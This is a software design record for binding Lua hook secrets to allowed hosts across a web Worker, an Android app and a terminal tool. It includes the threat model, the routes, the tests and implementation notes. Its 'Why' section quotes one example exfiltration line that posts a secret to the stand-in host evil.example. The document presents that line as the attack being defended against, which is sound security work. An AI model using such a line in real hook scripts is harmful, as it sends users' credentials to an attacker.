# 0012: Hook secrets bound to their hosts

- **Status:** in progress
- **Created:** 2026-11-17
- **Layer:** both (the hook runner in `tc_core::lua_hooks` and the secret stores of each host; the secrets screens)
- **Front ends:** web, Android, terminal (`meghnaad-hook`: its secrets are environment variables)
- **Supersedes / related:** 0011 (a git token can now write the hooks script); 0013 (the static web app depends on this)

## Why

Whoever can save the hooks script can read every hook secret and send it anywhere. The script names the hosts it may
call (`allow_hosts{…}` at its top), `secret("name")` hands it the value, and the runner keeps that value out of what the
script prints or returns but not out of a request. So one line, `http.post("https://evil.example", { body =
secret("JIRA") })` with `allow_hosts{"evil.example"}`, sends a secret out.

Who can save the script is wider than "the person in the app":

- On the web, anything acting in a signed-in page (a malicious extension, an injected script) can `PUT /api/hooks`.
- The phone takes `web/hooks.lua` from the bucket or the git branch and runs it with **its own** secrets, which are kept
  on the phone and never synced. Anyone who can write the bucket (its keys) or the branch (the git token) gets the
  phone's secrets at the next hook run, without knowing the encryption secret.

A secret should go only where its owner said it may, whatever the script says.

## What

- **Each secret has hosts.** In **Settings → Hooks → Secrets** (web and phone) a secret is saved with its value and the
  hosts it may be sent to, such as `acme.atlassian.net` or `*.example.com`. The list shows each secret's name and hosts,
  never its value. The hosts can't be changed on their own: changing them means typing the value again, so a page that
  can't read the value can't redirect it.
- **Scripts don't change for the common case.** `headers = { Authorization = "Bearer " .. secret("JIRA") }` keeps
  working when the request goes to one of `JIRA`'s hosts. Sent anywhere else, the request is refused before it leaves:
  `JIRA may only be sent to acme.atlassian.net`.
- **A script never holds a value.** `secret("JIRA")` gives a stand-in that only the runner can turn back into the value,
  and only when it is in a request to one of the secret's hosts (in the address, a header or the body). Printing it,
  returning it in a task, encoding it or cutting it up yields only the stand-in.
- **A secret with no hosts can't be sent anywhere.** Secrets saved before this change have none; the Secrets screen marks
  them **needs hosts**, and a hook using one says so.
- **Worker secrets set by deploy** (`HOOK_SECRET_<NAME>`) take their hosts from `HOOK_SECRET_<NAME>_HOSTS`
  (comma-separated), also a Worker setting, never one the page can write.
- **`meghnaad-hook`** (secrets are environment variables): `JIRA_TOKEN` goes only to the hosts in `JIRA_TOKEN_HOSTS`.
- **Docs** (`docs/using/hooks.md`) say what a secret's hosts are, how to set them on each host, and what a script can no
  longer do with a secret (below).

## Not doing

- Computing with a secret inside the script: Base64 of a value, signing (HMAC) with it, or putting it in a cookie jar.
  With a stand-in, those give the wrong answer. Today's example already stores the Basic credentials pre-encoded; a host
  function such as `hmac(secret("X"), data)` is an open question, not part of this.
- Taint tracking of values derived from a secret: there is nothing to track, since the script never has the value.
- Changing `allow_hosts`. It still limits requests that carry no secret.
- Protecting against code running in an unlocked page of the static web app (0013): that page holds the encryption
  secret and so can reseal anything.

## Design

**Runner (`tc_core::lua_hooks`).**

- `Net::secret(name)` returns `Option<Secret { value, hosts: Vec<String> }>` instead of the value.
- `secret("NAME")` returns a stand-in: `⟦secret:NAME:<tag>⟧`, where `<tag>` is random for each runner, so text from a
  task or a response can't produce one by chance. The host passes the randomness in, since the sandbox has none. The
  runner keeps `NAME → Secret` for the call.
- `http_call` checks `allow_hosts` as now. It then finds every stand-in in the URL, the header values and the body. For
  each one, the request's host must match that secret's hosts, using the same matching as `allow_hosts`, `*.` included.
  Otherwise the request is refused, naming the secret and its hosts. The values are substituted only then, in the copy
  handed to `Net::request`.
- Before a response reaches the script, any used secret's value in its body or headers is replaced by the stand-in, so
  a service that echoes a credential back can't leak it.
- Redirects stay unfollowed (the Worker's `hooknet.rs` and `net.rs` already use `redirect: manual` or no automatic
  redirect). That matters more now: a 30x must not carry a value to another host.
- The redaction of printed and returned output stays: the stand-in is what shows, and a value can no longer get there.
- `lua/prelude.lua` needs no change for `secret`. The docs' examples are checked by the test that runs them.

**Stores.**

| Host | Where the value is | Where its hosts are |
| --- | --- | --- |
| Worker, set from the app | `web/hook-secrets.enc` | the same sealed file, now `{name: {value, hosts}}`. The old `{name: value}` still reads, with no hosts |
| Worker, set by deploy | `HOOK_SECRET_<NAME>` Worker secret | `HOOK_SECRET_<NAME>_HOSTS` Worker var or secret |
| Phone | `crates/android/src/secrets.rs`, sealed with the Keystore key | the same sealed file, same shape as the Worker's |
| `meghnaad-hook` | environment variable `NAME` | environment variable `NAME_HOSTS` |

The phone and the Worker share the shape, and its parsing, through `tc_core`: a small `hook_secrets` module with the map
type, the old-format read, and host-list checks.

**Routes.**

- `PUT /api/secrets/<name>` takes `{"value": "…", "hosts": ["…"]}`. A plain-text body (today's form) is still accepted
  and saves a secret with no hosts. There is no route that changes hosts alone.
- `GET /api/secrets` answers `{"secrets": [{"name", "hosts"}]}` and keeps `names` for one release.
- The phone's engine answers the same routes through its `api` call.

**Screens.** Web (`Settings → Hooks → Secrets`) and Kotlin get a hosts field beside the value, the list shows hosts and
**needs hosts**, and editing asks for the value again.

**Size.** The runner change is small. The Worker carries it; the browser engine doesn't carry hooks. To be measured.

## Acceptance criteria

- [x] A script can't get a secret's value out: tests in `tests/lua_net.rs` for each route out (a request to another
      host, in the URL, a header or the body; printing; returning it in a task; Base64 or `string.sub` pieces; a
      response that echoes it; a redirect) all fail or carry only the stand-in.
- [x] A request to one of a secret's hosts gets the real value in the URL, a header or the body (`*.` matching
      included), and today's documented examples work once the secret has hosts.
- [x] A secret's hosts can't be changed without its value: no route does it, and a test proves it on the Worker routes
      and on the phone's `api`.
- [x] The old secrets file still reads (as secrets with no hosts), and a hook using one says it needs hosts.
- [x] Worker deploy secrets take `HOOK_SECRET_<NAME>_HOSTS`; `meghnaad-hook` takes `<NAME>_HOSTS`.
- [x] The attack in **Why**: a `hooks.lua` written straight into the bucket or branch, run on the phone, can't send the
      phone's secrets to a host of its own (an Android test).
- [ ] Screens: web and Android show and set hosts, and mark secrets that need them.
- [x] Tests: `cargo test -p tc-core --features lua`, the Worker and phone tests, web and Kotlin tests for the screens.
- [x] Docs: `docs/using/hooks.md`, `docs/architecture.md` (Hooks: what a script may do), `docs/android.md`.
- [x] Size: Worker wasm measured before and after.

## Open questions

Settled 2026-11-17 by building with the proposals (the person asked for the fix, then a release):

- **Migration:** secrets kept before this have no hosts and go nowhere until they are kept again with hosts; the
  Secrets list marks them **needs hosts**, and a hook using one says so.
- **Signing:** no `hmac` or Base64 of a secret for now; added when a hook needs it.
- **Script changes:** not warned about. With hosts bound, a changed script can't take a secret; it can still change
  tasks, which stays as it is.

## Implementation notes

Filled in while building: what was done, where, anything that differed from the design and why, sizes measured, and
what is left. Dated entries, newest last.

### 2026-11-17

- Design change: the stand-in is a fixed `⟦secret:NAME⟧`, with no random tag. A forged stand-in (typed into a task, or
  sent back by a service) can only name a secret, which `secret()` already does, and it is filled in only for one of
  that secret's own hosts, so randomness bought nothing.
- `tc_core::hook_secrets`: `Secret { value, hosts }`, `Secrets` (a sorted list), the old `{name: value}` form read as no
  hosts, `from_request` (JSON with a value, or plain text as before; a JSON object with `hosts` but no `value` is
  refused rather than kept as a value, a bug the phone's route test found), host checks and matching. The Worker
  (`session.rs`, `lib.rs`, `hooknet.rs`) and the phone (`secrets.rs`, `net.rs`, the `api` routes) use it.
  `meghnaad-hook` reads `<NAME>_HOSTS`.
- `lua_hooks`: `secret()` returns the stand-in; `http_call` fills values in only for the secret's hosts (URL path and
  query, headers, body), refuses a stand-in in the host part, and turns an echoed value (response body, headers, a
  failed request's reason) back into the stand-in. All three hosts already refuse to follow redirects.
- Tests: `tests/lua_net.rs` (+5: another host by header, URL, body and JSON, a look-alike host, user-info, the host part,
  wildcards; encoding; an echo; a secret with no hosts; a failed request's reason); `hook_secrets` unit tests (+5);
  `tests/sync.rs` on the phone (routes with hosts, hosts without a value refused, and the attack: a `hooks.lua` written
  straight into the bucket can't reach its own host with the phone's secret); `meghnaad-hook`'s protocol tests; web
  `HooksPanel.test.ts` (+1) and Kotlin `HookSecretsTest` (2).
- On a running git Worker (scratch Forgejo): secrets saved before list with no hosts, hosts without a value are refused,
  a planted hook is stopped ("JIRA may only be sent to acme.atlassian.net, not httpbin.org"), and a deploy secret with
  `HOOK_SECRET_DEPLOYED_HOSTS=127.0.0.1` reached 127.0.0.1 and was refused for `localhost`.
- Sizes (gzip -9): R2 Worker 698,457 → 707,281 (+8.8 KB; first 14 KB, cut by reading the old form through `Value`
  instead of an untagged enum, one hand-written reader for `Secret`, and a list instead of a map of its own type);
  git Worker 715,531 → 724,365; engine unchanged (861,758).
- Left: the Android Secrets screen seen on a device or emulator (its helpers are unit-tested, the composable is not).

